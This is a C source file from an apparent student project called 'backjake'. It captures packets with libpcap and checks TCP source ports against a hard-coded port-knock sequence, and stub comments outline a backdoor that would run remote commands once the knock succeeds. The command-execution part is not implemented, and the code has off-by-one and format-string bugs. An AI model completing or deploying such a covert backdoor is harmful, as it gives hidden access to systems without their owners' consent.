/*-----------------------------------------------------------------------------------------------
--	Source File:	pktcap.c - Contains the main datagram receiving functions used by pscan.c
--
--	Functions:	Misc libpcap functions- packet filtering library based on the BSD 
--			packet filter (BPF)
--
--	Interface:	void * ReceiveDatagram (void *pcap_arg)
--				pcap_arg - pointer which will be cast into a pointer to 
--					   struct PcapInfo 
--			    struct PcapInfo: contains all of the packet capture components
--				pcap_t* nic_descr - descriptor to the active NIC
--				bpf_u_int32 netp - address/subnet mask
--				char cmd[MAXLINE] - Packet Filter string to be compiled into the NIC
--
--	Date:		June 24, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function will use the address and filter string and use them in the pcap_compile() and 
-- 	pcap_setfilter() functions to selectively capture packets of interest. It then invokes 
--	the main callback function to start the packet capture loop.
--
--
--	
-------------------------------------------------------------------------------------------------*/

#include "backjake.h"

static int i = 0;
int tries[10] = {0};
int fails = 0;

static void endProgram (int signo);

void* ReceiveDatagram (void *pcap_arg)
{ 
	printf("Reading!\n");
	struct bpf_program fp;
	PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
		
	pcapCompile(pcap_ptr, &fp);
	pcapFilter(pcap_ptr, &fp);
	pcapListen(pcap_ptr);

	return NULL;
}

void setupSignals()
{
    if (signal(SIGINT, endProgram) == SIG_ERR)
        perror("signal(SIGINT) error");    
}

void pcapListen(PcapInfo * pcap_ptr)
{
	void *status = NULL;

	pcap_loop (pcap_ptr->nic_descr, -1, packetHandler, NULL);

	if (ExitFlag == TRUE)
	{
		pthread_exit (status);
	}
	
	exit (0);
}

void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if(pcap_compile (pcap_ptr->nic_descr, fp, pcap_ptr->cmd, 0, pcap_ptr->netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1); 
	}
}

void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if (pcap_setfilter(pcap_ptr->nic_descr, fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}
}

int checkPacketSize()
{
	return ((sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr)) > 40);
}

void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	static int count = 1;
	int len;
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;
	struct udphdr *udp_header;
	int correct[] = {8080, 9056, 1005, 28}; // change this later
	size_t j = 0;

	if (checkPacketSize())
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));	
			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				// printf("Source Port: %d\n", ntohs(tcp_header->source));
				// printf("Dest Port: %d\n", ntohs(tcp_header->dest));
				// printf("\n");
				int temp = sizeof(correct)/sizeof(int);
				if (i == temp)
					i = 0;

				tries[i++] = (int) ntohs(tcp_header->source);

				//("%d\n", temp);

				for (j=0; j<=temp; j++)
				{
					printf("i:%d j:%d try:%d cor:%d\n", i, j, tries[j], correct[j]);
					if( tries[j] != correct[j])
					{
						fails++;
						break;
					}

					if (j == temp)
					{
						printf("============ AUTH ============\n"); // change this later
						for (j=0; j<=temp; j++)
							tries[j]=0;
						i = 0;
						fails = 0;
					}
				}

				if (fails == temp+1)
				{
					for (j=0; j<=temp; j++)
						tries[j]=0;
					i = 0;
					fails=0;
				}
			}
		}
	}
	ExitFlag = TRUE;
}

int PrintInHex(char *mesg, unsigned char *p, int len)
{
	printf(mesg);

	while(len--)
	{
		printf("%.2X ", *p);
		p++;
	}
	printf("\n");
	return 0;
}

int authenticatedClient()
{
    // NOT YET IMPLEMENTED
    
    // spawn knock code listener
    // while getting commands
    //          execute command
    //          spawn result thread, pipe in results
}

void* knockListener(void* pcap_arg)
{
    // NOT YET IMPLEMENTED
    //
    return NULL;
}

void executeCommand()
{
    //spawnThread();
}


static void endProgram (int signo)
{
    // stop the program
    exit(1);
}